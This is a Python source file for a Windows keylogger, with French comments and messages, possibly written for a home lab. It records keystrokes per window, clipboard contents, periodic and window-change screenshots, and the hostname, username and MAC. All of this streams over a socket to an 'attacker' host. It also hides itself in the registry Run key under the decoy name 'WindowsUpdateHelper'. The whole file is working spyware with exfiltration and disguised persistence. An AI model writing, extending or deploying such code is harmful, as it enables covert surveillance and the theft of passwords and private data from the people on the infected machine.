import getpass
import os
import platform
import sys
import uuid
from venv import logger
import winreg
from pynput import keyboard
import win32gui
from datetime import datetime
from PIL import ImageGrab
import time
import pyperclip
import threading
import socket
import io
import random

current_window = ""
log_data = {}
previous_clipboard = ""

sock = None
try:
    import win32gui
    import win32clipboard
    WIN32_AVAILABLE = True
except ImportError:
    print("Warning: pywin32 not found. Some features (window title, clipboard) disabled.")
    WIN32_AVAILABLE = False

def connect_to_attacker(ip, port):
    global sock
    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    try:
        sock.connect((ip, port))
        print(f"[+] Connecté à l'attaquant {ip}:{port}")
        system_info = get_system_information()
        envoyer_log(system_info)
        print("[+] Informations système envoyées.")
    except Exception as e:
        print(f"[-] Échec connexion à l'attaquant : {e}")
        sock = None


def envoyer_image(img_data, filename):
    global sock
    if sock is None:
        print("[-] No connection, image not sent")
        return
    
    try:
        # Send header with newline
        header = f"IMAGE|{filename}|{len(img_data)}\n".encode('utf-8')
        sock.sendall(header)
        print(f"[📸] Sent header for {filename} ({len(img_data)} bytes)")
        
        # Send image data in chunks
        total_sent = 0
        chunk_size = 4096
        while total_sent < len(img_data):
            chunk = img_data[total_sent:total_sent+chunk_size]
            sent = sock.send(chunk)
            if sent == 0:
                raise RuntimeError("Socket connection broken")
            total_sent += sent
            print(f"[📸] Sent {total_sent}/{len(img_data)} bytes")
            
        print(f"[✅] Successfully sent {filename}")
    except Exception as e:
        print(f"[❌] Error sending image: {e}")
        # Attempt to reconnect
        connect_to_attacker("192.168.56.102", 9999)
def envoyer_log(message):
    global sock
    if sock is None:
        return
    try:
        data = f"LOG|{message}".encode()
        sock.sendall(data + b"\n")
    except Exception as e:
        print(f"Erreur envoi log : {e}")

def capture_ecran(window_title):
    time.sleep(0.5)
    now = datetime.now().strftime("%Y%m%d_%H%M%S")
    safe_title = "".join(c if c.isalnum() else "_" for c in window_title)
    filename = f"{now}_{safe_title}.png"

    screenshot = ImageGrab.grab()

    # Convertir l'image en bytes PNG en mémoire
    img_byte_arr = io.BytesIO()
    screenshot.save(img_byte_arr, format='PNG')
    img_data = img_byte_arr.getvalue()

    print(f"[📸] Capture réalisée : {filename} (envoi en cours...)")

    # Appeler ta fonction d'envoi, à définir
    envoyer_image(img_data, filename)

def afficher_resume():
    print("\n\n===== Résumé des frappes par fenêtre =====\n")
    for window, (start_time, chars) in log_data.items():
        print(f"Fenêtre : {window}")
        print(f"Ouvert à : {start_time}")
        print("Contenu :")
        print(''.join(chars))
        print("\n" + "-"*50 + "\n")

def surveiller_presse_papier():
    global previous_clipboard
    while True:
        try:
            current_content = pyperclip.paste()
            if current_content != previous_clipboard and current_content.strip() != "":
                previous_clipboard = current_content
                now = datetime.now().strftime('%H:%M:%S')
                fenetre = get_active_window_title()

                if fenetre not in log_data:
                    log_data[fenetre] = [now, []]

                log_data[fenetre][1].append(f"[CLIPBOARD CHANGÉ : {current_content}]")
                print(f"[{now}] {fenetre} > [CLIPBOARD CHANGÉ : {current_content}]")
        except Exception as e:
            print(f"[Erreur clipboard] {e}")
        time.sleep(0.5)

def get_active_window_title():
    """Gets the title of the currently active window."""
    if not WIN32_AVAILABLE:
        return "[Win32 API Unavailable]"
    try:
        hwnd = win32gui.GetForegroundWindow()
        title = win32gui.GetWindowText(hwnd)
        return title if title else "[No Title]"
    except Exception as e:
        logger.error(f"Error getting active window title: {e}")
        return f"[Error: {e}]"
def on_press(key):
    global current_window, log_data

    if key == keyboard.Key.esc:
        print("\n[!] Interruption détectée (Esc), arrêt du keylogger...\n")
        afficher_resume()
        return False

    now = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
    new_window = get_active_window_title()

    if new_window != current_window:
        current_window = new_window
        print(f"\n[+] {now} | Nouvelle fenêtre active : {current_window}")
        if current_window not in log_data:
            log_data[current_window] = [datetime.now().strftime("%H:%M:%S"), []]
        capture_ecran(current_window)

    # Toujours s'assurer que la clé existe
    if current_window not in log_data:
        log_data[current_window] = [datetime.now().strftime("%H:%M:%S"), []]

    try:
        char = key.char
    except AttributeError:
        if key == keyboard.Key.space:
            char = " "
        elif key == keyboard.Key.enter:
            char = "\n"
        elif key == keyboard.Key.tab:
            char = "\t"
        elif key == keyboard.Key.backspace:
            char = "[<--]"
        else:
            char = f"[{key.name}]"

    log_data[current_window][1].append(char)
    envoyer_touche_immediatement(current_window, char)
def add_registry_persistence():
    """
    Adds the script to Windows startup via HKCU\Run registry key.
    Name: 'WindowsUpdateHelper' (looks legit)
    """
    try:
        # Get the full path to the current script
        script_path = os.path.abspath(__file__)
        # Use the same Python executable that's running this script
        python_exe = sys.executable
        # Command: "python.exe" "C:\full\path\to\keylogger.py"
        command = f'"{python_exe}" "{script_path}"'

        # Open the Run key under HKEY_CURRENT_USER
        key = winreg.OpenKey(
            winreg.HKEY_CURRENT_USER,
            r"Software\Microsoft\Windows\CurrentVersion\Run",
            0,
            winreg.KEY_SET_VALUE
        )
        # Set the value
        winreg.SetValueEx(key, "WindowsUpdateHelper", 0, winreg.REG_SZ, command)
        winreg.CloseKey(key)

        print("[+] Persistence added to registry: WindowsUpdateHelper")
    except Exception as e:
        print(f"[-] Failed to add registry persistence: {e}")
def get_system_information():
    """
    Returns a formatted string with system info.
    """
    try:
        info = {
            "Hostname": platform.node(),
            "OS": f"{platform.system()} {platform.release()}",
            "Architecture": platform.machine(),
            "Username": getpass.getuser(),
            "UID (MAC-based)": ":".join(f"{uuid.getnode():012x}"[i:i+2] for i in range(0, 12, 2))
        }
        return "[SYSTEM_INFO]\n" + "\n".join([f"{k}: {v}" for k, v in info.items()])
    except Exception as e:
        return f"[SYSTEM_INFO_ERROR: {e}]"
def envoyer_logs_periodiquement():
    while True:
        try:
            if not log_data:
                time.sleep(10)  # fixe à 10 secondes
                continue

            resume = "\n\n===== Résumé des frappes par fenêtre =====\n\n"
            for window, (start_time, chars) in log_data.items():
                resume += f"Fenêtre : {window}\n"
                resume += f"Ouvert à : {start_time}\n"
                resume += "Contenu :\n"
                resume += ''.join(chars)
                resume += "\n" + "-"*50 + "\n\n"

            if resume.strip():
                envoyer_log(resume.strip())
                print("[📝] Logs envoyés périodiquement.")
                log_data.clear()

        except Exception as e:
            print(f"[!] Erreur lors de l'envoi périodique : {e}")

        time.sleep(10)  # sommeil fixe entre chaque envoi
def envoyer_touche_immediatement(window, char):
    """Send a single keystroke immediately."""
    now = datetime.now().strftime('%H:%M:%S')
    message = f"[{now}] {window} > {char}"
    envoyer_log(message)
def screenshot_thread():
    while True:
        time.sleep(30)  
        window_title = get_active_window_title()
        print(f"[📸] Periodic screenshot of: {window_title}")
        capture_ecran(window_title)


if __name__ == "__main__":
    # Connexion à l'attaquant
    add_registry_persistence()

    connect_to_attacker("192.168.56.102", 9999)
    screenshot_t = threading.Thread(target=screenshot_thread, daemon=True)
    screenshot_t.start()

    # Lancement des threads en arrière-plan
    clipboard_thread = threading.Thread(target=surveiller_presse_papier, daemon=True)
    clipboard_thread.start()

    #log_thread = threading.Thread(target=envoyer_logs_periodiquement, daemon=True)
    #log_thread.start()

    # Lancement du keylogger principal
    try:
        with keyboard.Listener(on_press=on_press) as listener:
            listener.join()
    except KeyboardInterrupt:
        afficher_resume()